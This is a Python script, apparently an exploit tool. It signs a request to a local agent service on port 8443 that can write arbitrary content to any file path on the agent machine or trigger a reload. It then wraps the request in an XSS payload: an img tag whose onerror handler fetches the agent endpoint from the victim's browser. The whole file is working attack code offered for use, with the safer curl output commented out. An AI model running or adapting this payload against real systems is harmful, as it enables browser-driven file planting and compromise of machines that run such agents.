#!/usr/bin/env python3
"""
Generate a signed agent request payload (download or reload).
Requires the 'cryptography' package (`pip install cryptography`).
"""
import argparse
import base64
import json
import secrets
from datetime import datetime, timezone
from pathlib import Path

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_private_key

DEFAULT_ENDPOINTS = {
    "download": "https://127.0.0.1:8443/download",
    "reload": "https://127.0.0.1:8443/reload",
    "ping": "https://127.0.0.1:8443/ping",
}


def utc_iso8601():
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")


def base_payload(op):
    return {
        "op": op,
        "nonce": secrets.token_hex(16),
        "timestamp": utc_iso8601(),
    }


def build_download_payload(target_path, content):
    path = Path(target_path)
    filename = path.name
    target_dir = str(path.parent)
    if target_dir == ".":
        target_dir = ""
    item = {
        "id": "manual-download",
        "payload": {
            "doc_id": 0,
            "content": content,
            "sign_chain": []
        },
        "target_dir": target_dir,
        "filename": filename
    }
    payload = base_payload("download")
    payload["items"] = [item]
    return payload


def build_reload_payload():
    return base_payload("reload")


def sign_payload(private_key_path, payload_json):
    key_data = Path(private_key_path).read_bytes()
    key = load_pem_private_key(key_data, password=None)
    signature = key.sign(
        payload_json.encode("utf-8"),
        padding.PKCS1v15(),
        hashes.SHA256()
    )
    return base64.b64encode(signature).decode("ascii")


def main():
    parser = argparse.ArgumentParser(
        description="Generate a signed agent request (download or reload).")
    parser.add_argument("--key", required=True,
                        help="Path to the private key (PEM)")
    parser.add_argument("--op", choices=["download", "reload", "ping"], default="download",
                        help="Agent operation to invoke (default: download)")
    parser.add_argument("--target",
                        help="Target file path on the agent machine (download only)")
    parser.add_argument("--content",
                        help="Literal content to write into the file (download only)")
    parser.add_argument("--content-file",
                        help="Path to a file whose contents will be written (download only)")
    parser.add_argument("--endpoint",
                        help="Agent endpoint URL (defaults to op-specific URL)")
    args = parser.parse_args()

    endpoint = args.endpoint if args.endpoint else DEFAULT_ENDPOINTS[args.op]
    if args.op == "download":
        if not args.target:
            parser.error("--target is required for download operation")
        if args.content is not None and args.content_file:
            parser.error("Use either --content or --content-file, not both")
        if args.content_file:
            content_value = Path(args.content_file).read_text()
        elif args.content is not None:
            content_value = args.content
        else:
            parser.error("Either --content or --content-file must be provided for download operation")
        payload_dict = build_download_payload(args.target, content_value)
    elif args.op == "reload":
        payload_dict = build_reload_payload()
    else:
        payload_dict = base_payload("ping")
    payload_json = json.dumps(payload_dict, ensure_ascii=False, separators=(",", ":"))
    signature_b64 = sign_payload(args.key, payload_json)

    request_body = {
        "p": payload_json,
        "s": signature_b64
    }

    curl_cmd = [
        "curl",
        "-k",
        "-H", "Content-Type: application/json",
        "-d", "'"+json.dumps(request_body, ensure_ascii=False)+"'",
        endpoint
    ]

    payload = f"<img src=x onerror=\"fetch('{endpoint}', {{method: 'POST',headers: {{ 'Content-Type': 'application/json' }},body: atob('"
    payload += base64.b64encode(json.dumps(request_body, ensure_ascii=False).encode('utf-8')).decode('utf-8')
    payload += "'),})\">"

    #print(" ".join(curl_cmd))

    print(payload)


if __name__ == "__main__":
    main()
